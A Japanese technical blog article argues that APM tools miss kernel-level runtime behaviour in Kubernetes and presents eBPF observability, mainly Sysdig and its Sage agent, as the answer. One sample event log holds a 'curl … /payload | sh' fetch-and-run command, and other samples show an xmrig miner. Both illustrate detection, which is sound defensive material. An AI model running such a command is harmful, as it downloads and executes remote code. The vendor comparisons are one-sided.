---
title: APMだけでは守れない時代へ ― Runtime-native Observabilityとは何か、なぜ今なのか
tags:
  - Kubernetes
  - Observability
  - APM
  - eBPF
  - Security
---

# APMだけでは守れない時代へ
## ― Runtime-native Observabilityとは何か、なぜ今なのか

## はじめに：APMが変えた世界

2010年代、クラウドへの移行とともに、Observabilityは大きな転換期を迎えました。

モノリスが解体され、サービスは細分化された。
デプロイは週次から日次、日次から分次へと加速した。
「どこが遅いのか」を人間が目視で追うことは、もはや不可能になった。

その答えとして登場したのがAPM（Application Performance Monitoring）です。

- 分散トレーシングによって、リクエストが複数のサービスをまたぐ様子が一本の線として見えるようになった
- SLO（Service Level Objective）文化が根付き、「99.9%の可用性」という数字がエンジニアとビジネスの共通言語になった
- Datadog、New Relic、Dynatraceといったツールが、オンコール対応の質を根本から変えた

APMは間違いなく、クラウド時代の第1フェーズを定義したテクノロジーです。

しかし今、私たちは新たなフェーズに立っています。
そしてそのフェーズでは、APMだけでは「見えないもの」が増えています。

---

## APMが見えていること、見えていないこと

APMが収集するデータは主に3つです。

**メトリクス（Metrics）**
CPU使用率、レイテンシ、スループット、エラーレート。「何が遅いか」「どこが詰まっているか」を数値で示す。

**トレース（Traces）**
リクエストがサービスAからB、BからCへと流れる経路と時間。「どのホップで遅延が発生したか」を可視化する。

**ログ（Logs）**
アプリケーションが出力した構造化・非構造化テキスト。「何が起きたか」の記録。

この3つは非常に強力で、現在も絶対に必要なデータです。

:::note warn
ここに本質的な問いがあります。

**APMが観測しているのは「アプリケーションが語ること」です。**

アプリケーションが出力したトレース、SDKが計装したメトリクス、loggerが吐いたログ。
すべて「アプリケーション自身が報告したもの」です。
:::

問題は、アプリケーションが報告しない領域が存在することです。

- Podが突然クラッシュしたとき、その直前に何のプロセスが何をしていたか
- コンテナ内で予期せず実行されたシェルコマンド
- アプリケーションが知らないところで発生しているネットワーク接続
- サイドカーやinitコンテナの実行履歴
- Podが消えた後の「消えた理由」

APMはアプリケーション層の透明度を高めました。
しかし、**インフラ層・OS層・ランタイム層での「実際の挙動」は、依然としてブラックボックスのままです。**

---

## Kubernetesが変えた前提

この問題が特に深刻になったのは、Kubernetesが前提となったからです。

Kubernetesの世界では、

- Podは数分で消え、数秒で生まれる
- ノードは動的にスケールし、ワークロードは移動する
- ネットワークはオーバーレイされ、サービスメッシュが介在する
- 同一Nodeで、まったく無関係な複数のワークロードが同居する

従来のインフラ監視は「静的な環境」を前提としていました。
特定のIPアドレスにエージェントを入れ、そのホストを継続的に監視する。

Kubernetesでは、その前提が崩壊しています。

| 従来のインフラ | Kubernetes |
|--------------|-----------|
| IPは固定 | IPは動的に割り当て |
| ホストは管理対象 | ノードは使い捨て |
| 状態（State）を監視 | 変化（Change）を追う |
| サービスは長期稼働 | Podはエフェメラル |

**「状態を監視する」時代から、「変化を追う」時代に移行している。**
この変化に、APMのアーキテクチャは追いついていません。

---

## 最大の盲点：セキュリティとパフォーマンスの境界崩壊

APM時代の世界観では、「パフォーマンス問題」と「セキュリティインシデント」は別の問題でした。

- SREはAPMを見る
- セキュリティチームはSIEMを見る

ツールも、チームも、分離されていた。

しかし実際の現場では、**この2つは同じ事象の表と裏である**ことがあります。

### シナリオ1：謎のCPUスパイク

あるKubernetesクラスターで、深夜2時にCPU使用率が急上昇しました。

```
APMのアラート：「Pod Xのレイテンシが増加」
オンコール対応：「CPUが高い、でも原因不明」→ Podを再起動 → アラート解消
```

翌朝、セキュリティチームが別の経路で発見します。
**そのPodは、暗号通貨マイニングのプロセスを動かされていた。**

APMは「遅いこと」を教えてくれた。しかし、「なぜ遅かったか」を教えてくれなかった。

### シナリオ2：AIモデルのGPU異常

GPUクラスターで、推論サービスのGPU使用率が突然200%近くになりました。

「AIモデルのリクエストが急増した？」「バグでバッチ処理が重なった？」

APMのメトリクスには、GPU使用率の数値は見えます。
しかしそのGPUが「どのプロセスに」「どのコンテキストで」使われたのかは見えない。

**正規の推論リクエストなのか、想定外のワークロードが紛れ込んだのか。**
この判断に必要な情報が、APMには存在しません。

### シナリオ3：消えたPodの真相

本番環境のPodが予告なく消えました。

```bash
$ kubectl describe pod <pod-name>
...
Reason: OOMKilled
```

ログを確認しても、アプリケーションが出力した最後のエラーしかない。

- なぜメモリが急増したのか
- どのプロセスが消費したのか
- その直前にどんなネットワーク通信が発生したのか

**Podが消えた後、その情報は消えています。**

---

## Runtime-native Observabilityとは何か

この問いへの答えとして登場してきたのが、**Runtime-native Observability**という考え方です。

「Runtime-native」とは何を意味するか。

> **実行時（Runtime）の挙動を、OSカーネルレベルから直接観測する。**
> アプリケーションが「語ること」を待つのではなく、カーネルが「実際に起きていること」を直接収集する。

これを技術的に実現しているのが、**eBPF（extended Berkeley Packet Filter）**です。

---

## eBPF：Runtimeを観測するための新しい基盤

eBPFは、Linuxカーネルの機能の一つです。

従来、カーネルの挙動を観測するためにはカーネルモジュールを書く必要がありました。
これはリスクが高く、クラッシュの原因になりうる危険な作業でした。

eBPFは、**カーネルを変更せずに、カーネル内でコードを安全に実行する仕組み**です。

これによって何が可能になるか。

| 観測対象 | 取得できる情報 |
|----------|---------------|
| システムコール | どのプロセスが、いつ、何のシステムコールを発行したか |
| ネットワーク | どのコンテナが、どのIPに、何のポートで接続したか |
| ファイルシステム | どのプロセスが、どのファイルを読み書きしたか |
| プロセス生成 | どのコンテナ内で、どんなコマンドが実行されたか |
| メモリ | どのプロセスがどのタイミングでメモリを大量消費したか |

:::note info
**アプリケーションのコードを一行も変えずに、インフラ・OS・ランタイムレベルのあらゆる挙動を収集できます。**
これが、Runtime-native Observabilityの技術的基盤です。
:::

---

## APMとRuntime-native Observabilityの比較

混同を避けるために整理します。

| 観点 | APM | Runtime-native Observability |
|------|-----|------------------------------|
| 観測層 | アプリケーション層 | OS・カーネル・ランタイム層 |
| データ収集 | SDK計装・エージェント注入 | eBPF・カーネルフック |
| コード変更 | 必要（計装） | 不要 |
| 観測対象 | リクエスト・トレース・ログ | システムコール・プロセス・ネットワーク |
| Pod消滅後 | 情報が消える | ホスト側に履歴が残る |
| セキュリティ連携 | 限定的 | ネイティブ統合 |
| 盲点 | OS層・カーネル層 | アプリ内部のビジネスロジック |

**これはどちらが優れているかという話ではありません。**

APMはアプリケーションの内側を見る。
Runtime-native Observabilityはアプリケーションの外側を見る。

この2つは補完関係にあります。

---

## 主要APMツールとの直接比較

「APMで十分ではないか」という疑問に答えるために、代表的なツールを名指しで比較します。

### Datadog

現在最も広く使われているクラウドネイティブ監視ツールです。

Datadogが強い領域：
- APM・分散トレーシング
- メトリクスの集約と可視化
- ログ管理との統合
- Kubernetes環境のインフラ監視

**Datadogの限界：**

DatadogはKubernetesのPodメトリクスやコンテナログを収集できます。
しかしその収集方法は、**KubernetesメトリクスサーバーやコンテナランタイムAPIへのポーリング**が基本です。

```
Datadog Agent
  └─ kubelet API からメトリクス取得
  └─ Docker/containerd API からコンテナ情報取得
  └─ アプリケーションSDK からトレース取得
```

つまり、「Kubernetesが公開している情報」しか見ていない。

コンテナ内で発生したシステムコール、プロセス生成、ネットワーク接続の詳細は、
**Kubernetesが公開しないため、Datadogにも見えません。**

DatadogはCloud SIEMやCSPM（Cloud Security Posture Management）機能を持っていますが、
これはログベースの検知であり、リアルタイムのカーネルレベル観測とは設計が異なります。

---

### New Relic

New RelicはAPMのパイオニアであり、フルスタック可観測性を標榜しています。

New Relicが強い領域：
- アプリケーションパフォーマンス監視
- ブラウザ・モバイルを含むエンドツーエンドのトレース
- NRQLによる柔軟なクエリ
- コスト最適化（データ量課金）

**New Relicの限界：**

New Relicの観測も、基本的には**計装（Instrumentation）ベース**です。
エージェントはアプリケーションプロセスに注入され、アプリが「報告する」データを収集します。

コンテナが何のシステムコールを発行したか、
どのプロセスが予期せず起動したか、
という情報は収集設計の外にあります。

New Relicはセキュリティ機能（IAST）を持っていますが、
これはアプリケーション層の脆弱性テストであり、
**Runtime上での不審な挙動検知ではありません。**

---

### Dynatrace

DynatraceはOneAgentという単一エージェントで「フルスタック自動検出」を実現しており、
Runtime観測に最も近い設計を持つAPMベンダーの一つです。

Dynatraceが強い領域：
- AIによる自動根本原因分析（Davis AI）
- OneAgentによる自動計装
- サービスマップの自動生成

**Dynatraceの限界：**

OneAgentはプロセス・ネットワーク・ホストの情報を収集しますが、
その収集はOS APIベースです。

eBPFを活用した一部の機能はあるものの、
**設計の中心はあくまでアプリケーションパフォーマンスの最適化**です。

セキュリティ文脈での利用（不審なプロセス実行の検知、コンテナからの異常な外部接続等）は
主要ユースケースの外にあります。

また、KubernetesのPodが消えた後の詳細なシステムコール履歴は、OneAgentでも残りません。

---

### Prometheus + Grafana（OSS構成）

多くのKubernetes環境で使われているOSSの定番スタックです。

強い領域：
- メトリクスの収集と可視化
- コスト（OSS）
- エコシステムの広さ（Exporterの豊富さ）

**この構成の限界：**

Prometheus + Grafanaは**メトリクスプラットフォーム**です。

```yaml
# kube-state-metricsが見ているもの
kube_pod_status_phase
kube_deployment_status_replicas
node_cpu_seconds_total
```

これらはKubernetesオブジェクトの「状態」であり、コンテナ内の「実行時挙動」ではありません。

トレースにはTempoが、ログにはLokiが必要になりますが、
それらを統合しても**OS・カーネル層の観測は設計の外**です。

---

### PrometheusはSysdig Sageに対抗できるか

**Prometheusの反撃：エコシステムによる拡張**

「Prometheusではカーネル層が見えない」という批判に対して、
コミュニティは着実に対応してきました。

```
Prometheus拡張エコシステム：
  ├─ node-exporter      → ホストレベルのシステムメトリクス
  ├─ cAdvisor           → コンテナリソース使用量
  ├─ kube-state-metrics → Kubernetesオブジェクトの状態
  ├─ DCGM Exporter      → NVIDIA GPU詳細メトリクス
  └─ ebpf_exporter      → eBPFプログラムの結果をメトリクスとして公開
```

特に`ebpf_exporter`の登場は重要です。
eBPFで収集したカーネルレベルのデータを、Prometheusのメトリクスとして公開できる。

これによって理論上は、Prometheusスタックでもランタイム層の情報を扱えます。

**しかし、ここに本質的な差があります。**

Prometheusが得意なのは「メトリクス」、つまり**数値の時系列データ**です。

```
# ebpf_exporterで取れるもの（メトリクス）
syscalls_total{syscall="execve"} 142
network_bytes_total{direction="egress"} 8192000
```

一方、Sysdig Sageが扱うのは**イベントの文脈（コンテキスト）**です。

```
# Sysdigが記録するイベント（コンテキスト付き）
timestamp: 2024-01-15T02:34:17Z
event: execve
container: payment-service-7d9f8b-xk2p9
namespace: production
pod_uid: a3f2c1d4-...
process: /bin/bash
parent_process: python3 /app/server.py
user: root
args: ["-c", "curl http://203.0.113.5/payload | sh"]
```

`syscalls_total{syscall="execve"} 142` という数値は、
「何かが142回実行された」ことは示しますが、
「**誰が、何を、なぜ実行したか**」は示しません。

**Sysdig Sage：Agenticが変えるトラブルシューティング**

Sysdig Sageは、SysdigがKubernetes・クラウドネイティブ環境専用に設計したAI Agentです。

従来のAI Assistantとの違いは「**Agentic**」にあります。

| | AI Assistant（従来） | Agentic AI（Sysdig Sage） |
|--|---------------------|--------------------------|
| 動作 | 質問に答える | 自律的に調査を進める |
| データアクセス | ユーザーが提示した情報 | システム全体のランタイムデータ |
| 深掘り | ユーザーが次の質問をする | 自動でコンテキストを展開 |
| 結論 | 回答を提示 | 根本原因まで特定して提示 |

具体的には、アラートが発火したとき：

```
[Sysdig Sage の自律調査フロー]

① アラート検知
   「production/payment-service でCPU異常」

② 自動でランタイムコンテキスト収集
   └─ 同タイミングのプロセス実行履歴を取得
   └─ ネットワーク接続先を確認
   └─ ファイルアクセスパターンを分析

③ 相関分析
   └─ 「通常のpython3プロセスに加え、/bin/bash が起動」
   └─ 「外部IP 203.0.113.5 への接続を確認」
   └─ 「同IPは過去に報告されたC2サーバーとマッチ」

④ 結論の提示（人間が確認する前に）
   「CPUスパイクの原因はマイニングマルウェアの可能性が高い。
    影響範囲：payment-service Pod 3台。
    推奨アクション：当該Podの隔離とフォレンジック調査。」
```

Prometheusのダッシュボードが「CPUが高い」というグラフを表示する間、
Sysdig Sageはすでに「**なぜ高いのか**」の調査を終えています。

これがPrometheusとSysdig Sageの本質的な差です。
**データの豊かさ**と**調査の自律性**、両方の違いがあります。

---

**Sage on Monitor ロードマップ：何がいつ来るのか**

Sysdig Sageの開発は、具体的なスケジュールで進んでいます。

**Q1 2026（早期リリース予定）**

トラブルシューティングへの特化からスタートします。

```
Sage on Monitor Q1 2026 の機能：
  ├─ アラート（イベント）を起点とした調査の開始
  ├─ 周辺イベントとの自動相関
  ├─ ライブログのリアルタイム調査
  ├─ PromQLによるメトリクス挙動の分析
  └─ 推奨ダッシュボードへの誘導
```

**Q2 2026**

自然言語操作とK8sとの深い統合が加わります。

```
Sage on Monitor Q2 2026 の機能：
  ├─ インタラクティブな提案による操作性の向上
  ├─ 自然言語 → PromQL の自動変換
  ├─ Kubernetes Advisorとの統合
  └─ ダッシュボードの深い理解と活用
```

**FY27 Q1（2026年末〜）**

文脈理解が飛躍的に向上し、自動対応への橋渡しが始まります。

```
Sage FY27 Q1 の機能：
  ├─ 論理・物理デプロイトポロジーの理解
  ├─ K8sデプロイ変更・コンテナイメージ更新の追跡
  ├─ MCPクライアント経由でのサードパーティ統合
  │    （クラウドプロバイダー、GitHub、K8s等）
  ├─ メトリクス相関と異常検知
  └─ Cost Advisorとのライトサイジング連携
```

:::note info
**MCP Server はすでにリリース済みです。**

Sysdig Monitor のMCP Serverはすでに公開されており、
Claude等のAIクライアントからSysdigのデータを直接参照できます。
ObservabilityとAIエージェントの統合は、ロードマップではなく現実になっています。
:::

---

### Runtime-native Observabilityツール群

| ツール | 分類 | 強い領域 | Runtime観測 | セキュリティ統合 |
|--------|------|----------|------------|-----------------|
| Datadog | APM | メトリクス・トレース・ログ統合 | △ | △（ログベース） |
| New Relic | APM | フルスタックAPM・コスト最適化 | △ | △（IAST） |
| Dynatrace | APM | 自動検出・AI分析 | △ | △ |
| Prometheus+Grafana | OSS Metrics | コスト・エコシステム | ✗ | ✗ |
| Sysdig | Runtime | eBPFセキュリティ+可観測性 | ◎ | ◎ |
| Falco | Runtime | ランタイムセキュリティ検知 | ◎ | ◎ |
| Cilium/Tetragon | Runtime | ネットワーク+プロセス観測 | ◎ | ◎ |
| Pixie | Runtime | ノンインスツルメンテーション | ○ | △ |

:::note info
**重要な前提：** これはAPMツールを否定する比較ではありません。

Datadogは今も最高のAPMです。
Prometheusのエコシステムは代替不可能です。

ただし、「コンテナ内で何が起きているか」という問いに対して、
これらのツールには設計上の限界があります。
その限界を補うのが、Runtime-native Observabilityです。

なお、Sysdigは**WiresharkのOSS共同創設者であるLoris Degioanniが2015年に創業**したセキュリティ・可観測性企業です。
ネットワーク解析の基礎技術を持つチームがeBPFとKubernetesに注力している点が、他のAPMベンダーとの本質的な違いです。
:::

---

## GPU監視：次の戦場

AIワークロードの急増により、GPU監視は急速に重要性を増しています。
Sysdigは2026年のロードマップに**NVIDIA・Intel・AMD の3社GPUへの対応**を明記しており、
GPU監視はRuntime-native Observabilityの最重要ユースケースの一つになっています。
そしてここでも、APM・Prometheus陣営とRuntime-native陣営の差が明確に出ます。

### Prometheusによる GPU監視：DCGM Exporter

NVIDIAが提供するDCGM（Data Center GPU Manager）Exporterを使うと、
PrometheusでGPUの詳細メトリクスを収集できます。

```yaml
# DCGM Exporterで取得できる主なメトリクス
DCGM_FI_DEV_GPU_UTIL          # GPU使用率（%）
DCGM_FI_DEV_MEM_COPY_UTIL     # メモリバンド幅使用率
DCGM_FI_DEV_FB_USED           # GPU显存使用量（MB）
DCGM_FI_DEV_POWER_USAGE       # 消費電力（W）
DCGM_FI_DEV_SM_CLOCK          # SMクロック（MHz）
DCGM_FI_DEV_GPU_TEMP          # GPU温度（℃）
```

これらは非常に有用なメトリクスです。
コスト管理、スケーリング判断、熱管理に活用できます。

**しかし、DCGM Exporterには見えないものがあります。**

```
DCGM_FI_DEV_GPU_UTIL = 98%

Q: このGPUを使っているのは誰？
A: DCGMには分からない

Q: 正規の推論サービスか、別プロセスか？
A: DCGMには分からない

Q: 複数のコンテナが同じGPUを共有しているとき、どのコンテナが何%使っているか？
A: MIG（Multi-Instance GPU）構成でなければ分からない
```

DCGM Exporterが見ているのは「GPUデバイスの状態」です。
「**誰がGPUを使っているか**」という文脈は持っていません。

---

### Runtime-native GPU監視：プロセスまで追う

eBPFベースのRuntime観測とGPU監視を組み合わせると、見える世界が変わります。

```
[Runtime-native GPU監視が答えられる問い]

GPU使用率 98%
  ├─ プロセス: python3 /app/inference.py  → 正規の推論サービス（72%）
  └─ プロセス: ./xmrig --algo kawpow    → 不正マイニングプロセス（26%）
       └─ 親プロセス: /bin/bash（コンテナ侵害の痕跡）
       └─ 外部接続: pool.hashrate.info:3333
```

単純な「GPU使用率98%」というメトリクスの裏に、セキュリティインシデントが隠れていることがあります。

DCGM Exporterではこの判断ができません。
Runtime-native Observabilityであれば、**GPUを使っているプロセスの完全な文脈**が見えます。

さらに、Sysdigが2026年に提供するGPU機能は「見る」だけに留まりません。

```
Sysdig GPU監視ロードマップ（2026年）：
  ├─ NVIDIA / Intel / AMD GPU のパフォーマンス監視
  ├─ KubernetesにおけるGPUコストの分析とチャージバック
  │    └─ チーム・Namespace・Deploymentごとのコスト帰属
  └─ 使用実績に基づくAIワークロードのGPUライトサイジング
       └─ 「このPodはGPUメモリを過剰確保しています」という指摘
```

特にライトサイジングは、GPU単価が高騰する現在において重要な機能です。
**「何を使っているか」の可視化が、「どれだけ節約できるか」のアクションに直結します。**

---

### GPU監視の比較

| 観点 | DCGM + Prometheus | Runtime-native（Sysdig等） |
|------|-------------------|--------------------------|
| GPU使用率 | ◎ | ○ |
| 消費電力・温度 | ◎ | △ |
| メモリ使用量 | ◎ | ○ |
| **使用プロセスの特定** | **✗** | **◎** |
| **コンテナ単位の帰属** | **△（MIG構成のみ）** | **◎** |
| **不正プロセスの検知** | **✗** | **◎** |
| コスト最適化・チャージバック | △ | ◎ |
| **AIワークロードのライトサイジング** | **✗** | **◎** |
| スケーリング判断 | ◎ | ○ |
| Intel / AMD GPU対応 | △（要別途Exporter） | ◎（ネイティブ対応予定） |

:::note warn
**AI時代のGPU監視における本質的な問い**

「GPUが何%使われているか」は、コスト管理には十分です。
しかし「GPUを誰が使っているか」が分からなければ、
高価なGPUリソースが不正に転用されても気づけません。

GPU単価が高騰し、AIワークロードが増える中、
この「誰が使っているか」という問いへの答えが、
Runtime-native Observabilityの重要なユースケースになっています。
:::

---

### Sysdig SageによるGPU異常の自律調査

GPU使用率が急騰したとき、Sysdig Sageはどう動くか。

```
[自律調査の例]

① GPU使用率アラート（98%、閾値80%超過）

② Sage の自律調査
   「GPUを使用中のプロセスを確認します」
   └─ PID 8821: python3 inference.py（正規） → 68%
   └─ PID 9203: ./xmrig（異常）           → 30%
       └─ 実行元コンテナ: ai-inference-7d9f
       └─ 実行トリガー: 外部からのRCE経由
       └─ 接続先: 既知のマイニングプールIP

③ Sage の結論（アラートから約15秒後）
   「GPU使用率急騰の原因：コンテナai-inference-7d9fへの侵害。
    RCE経由でマイニングプロセスが注入されました。
    推奨：該当Podの即時隔離。
    影響GPU：node-03のGPU 0番。他のGPUへの影響なし。」
```

Prometheusのダッシュボードには「GPU使用率 98%」というグラフが表示されます。
Sysdig Sageは15秒後に根本原因と推奨アクションを返します。

**これがPrometheusとSysdig Sageの、現実的な差です。**

---

## 具体的に何が見えるようになるのか

### 1. コンテナ内の不審なプロセス実行を検知

Webサーバーコンテナの中で、突然`/bin/bash`が起動された。
通常のWebサーバーには、シェルの実行は不要なはずです。

Runtime層の観測があれば、この異常を即座に検知できます。
APMはこのアクションを「遅延」としてしか観測できません（そして遅延すらないこともある）。

### 2. ネットワーク接続の完全な可視化

コンテナが「本来接続すべきでない外部エンドポイント」に接続した場合、
eBPFによるネットワーク観測であれば、コンテナ単位・プロセス単位での全接続先を記録できます。

### 3. Podが消えた後も残る証跡

Pod内での全システムコール履歴は、ホスト側のバッファに保存できます。
**Podが消えた後でも、「消える直前に何が起きていたか」を遡れます。**
これは事後調査（フォレンジック）において決定的な差を生みます。

### 4. GPU使用の文脈理解

GPUを使用したプロセスの名前・親プロセス・実行コマンドラインを記録できます。
「GPU使用率が高い」という数字に、「それが正規の推論サービスか、想定外のプロセスか」という文脈が加わります。

---

## セキュリティとObservabilityの統合

Runtime-native Observabilityの重要な側面の一つが、**セキュリティとの統合**です。

従来のセキュリティツール（SIEM・EDR）は、静的なサーバー・エンドポイントを前提としていました。
Kubernetesのような動的環境では、「環境が前提としているものが存在しない」という問題に直面します。

Runtime-native Observabilityは、Kubernetes環境を前提として設計されているため、

- Podの生存期間を考慮した検知ルール
- Namespace・Deployment・サービスアカウントとの相関
- MITRE ATT&CK for Containersフレームワークとの対応
- リアルタイムのポリシー適用（接続のブロック等）

が可能になります。

これは**CNAPP（Cloud-Native Application Protection Platform）**という概念とも重なります。
「守る」と「見る」が、同じデータソースから統合される世界です。

---

## 観測から自動対応へ：次のフロンティア

Runtime-native Observabilityが成熟すると、「見る」だけでなく「動く」フェーズに入ります。

Sysdigの2026年ロードマップには、**Automated Response Actions**が明記されています。

```
アラート発火
  └─ 条件に基づいた自動ワークフローの実行

設定例①：ノードが異常 → 自動でCordon（スケジューリング停止）
設定例②：Podが異常  → 自動でPod削除またはKill
設定例③：サービスがCPU圧迫 → 自動でスケールアウト
設定例④：侵害の疑い → 自動でネットワーク隔離
```

これは単なる自動化ではありません。
**ランタイムの観測データがあるからこそ、誤検知なく自動対応できる**という点が重要です。

APMのメトリクスだけを根拠に「Podを自動Kill」する設定は、誤検知のリスクがあり現実的ではありません。
しかし、eBPFで収集したランタイムイベント（不審なプロセス起動・異常なネットワーク接続）を根拠にすれば、
**「このPodは侵害されている」という判断の精度が劇的に上がります。**

```
[APMベースの自動対応の限界]
  アラート：「CPU使用率 95%」
  → 原因不明のまま自動再起動
  → マイニングプロセスは再起動後に復活

[Runtime-nativeベースの自動対応]
  アラート：「コンテナ内で./xmrigプロセスが起動、外部マイニングプールに接続」
  → 根拠が明確なため自動でネットワーク隔離を実行
  → フォレンジック用にログ・プロセス履歴を自動保全
```

観測（Observe）→ 分析（Analyze）→ 対応（Respond）のループを、
ランタイムデータを基盤として自動化する。

これが、Runtime-native Observabilityの最終形です。

---

## 実装への道：何から始めるか

Runtime-native Observabilityへの移行は、APMの置き換えではありません。

```
フェーズ1：現状把握
  └─ APMで「見えていないもの」を明示的にリスト化
  └─ セキュリティインシデントの事後調査で「証跡が足りなかった」経験を収集

フェーズ2：eBPFエージェントの導入
  └─ DaemonSetとして展開（アプリケーション変更不要）
  └─ 観測モードから開始し、正常なベースラインを把握

フェーズ3：相関の実装
  └─ APMのトレースIDとRuntimeイベントの相関付け
  └─ 「このトレースの時、OS層で何が起きていたか」を一画面で確認

フェーズ4：セキュリティポリシーの統合
  └─ 「正常な振る舞い」の定義
  └─ 逸脱時のアラート・ポリシー適用の自動化
```

---

## Observabilityの第2フェーズ

APMはObservabilityの第1フェーズを定義しました。

| | 第1フェーズ（APM） | 第2フェーズ（Runtime-native） |
|-|------|------|
| 中心的な問い | なぜ遅いのか | 何が本当に起きたのか |
| 観測層 | アプリケーション | OS・カーネル・ランタイム |
| 対象環境 | 静的インフラ | 動的・エフェメラル環境 |
| セキュリティ | 別チーム・別ツール | 統合 |
| データ収集 | 計装（Instrumentation） | カーネルフック（eBPF） |
| 主な活用 | パフォーマンス最適化 | 障害調査・セキュリティ・コスト最適化 |

第2フェーズは、第1フェーズを否定しません。
**第1フェーズを前提とした上で、その外側を覆う層を追加する。**

---

## おわりに

Kubernetesが前提になり、AIワークロードが増え、セキュリティとパフォーマンスの境界が曖昧になった世界で、アプリケーションが「語ること」だけを聞いていては、全体像は見えません。

Runtime-native Observabilityとは、
**インフラ・OS・ランタイムが「実際に行っていること」を、直接観測する考え方**です。

APMは、私たちにアプリケーションの内側を見せてくれました。
次のフェーズは、アプリケーションの外側を見ることです。

「遅い」を超えて、「何が本当に起きたか」を理解する。

それが、次のObservabilityです。
